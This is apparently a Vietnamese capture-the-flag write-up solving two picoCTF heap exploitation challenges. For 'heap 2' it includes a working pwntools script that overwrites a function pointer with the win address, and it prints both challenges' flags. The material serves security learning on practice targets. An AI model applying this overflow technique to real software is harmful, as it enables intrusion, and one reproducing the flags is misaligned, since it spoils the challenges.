# heap 1
## Challenge
[link challenge](https://play.picoctf.org/practice/challenge/439?category=6&difficulty=2&page=1)
## Solution
- Bài này giống bài [heap 0](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/easy/writeup.md), tuy nhiên có sự khác biệt ở chỗ biến `safe_var` phải là chuỗi `pico` thì ta mới thu được flag
- Thực hiện `nc tethys.picoctf.net 55200`
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-1.png)
## Flag
```picoCTF{starting_to_get_the_hang_9e9243f9}```
# heap 2
## Challenge
[link challenge](https://play.picoctf.org/practice/challenge/435?category=6&difficulty=2&page=1)
## Solution
- Đọc hàm `main` của file `chall.c`, ta vẫn thấy motip giống nhau đều là nhập `buffer` để làm tràn số, tuy nhiên bài này khó ở chỗ là chúng ta phải hiểu hàm `check_win`
```C
void check_win() { ((void (*)())*(int*)x)(); }
```
- Search chatgpt, tôi biết được rằng hàm này cho phép thực thi hàm `win` thông qua địa chỉ được lưu trong `x` hay nói cách khác `x` chính là địa chỉ của hàm `win`
-> Chúng ta phải đi tìm địa chỉ hàm `win`
- Sử dụng câu lệnh `objdump -D chall | grep win` ta thu được địa chỉ hàm win là `00000000004011a0`
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-2.png)
- Chúng ta phải chuyển địa chỉ hàm `win` sang `little-endian` để tiến hành viết payload. Lý do phải chuyển sang `little-endian` là vì:
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-3.png)
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-4.png)
- Viết payload để lấy flag:
```Python
from pwn import *

p = remote("mimas.picoctf.net", 51605)

payload = b'2'
p.sendlineafter(b"Enter your choice: ", payload)
payload = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x11\x40\x00\x00\x00\x00\x00'
p.sendlineafter(b"Data for buffer: ", payload)
payload = b'4'
p.sendlineafter(b"Enter your choice: ", payload)

p.interactive()
```
![alt text](https://github.com/nhh9905/CTF/blob/main/picoCTF/Binary%20Exploitation/medium/image-5.png)
## Flag
```picoCTF{and_down_the_road_we_go_91218226}```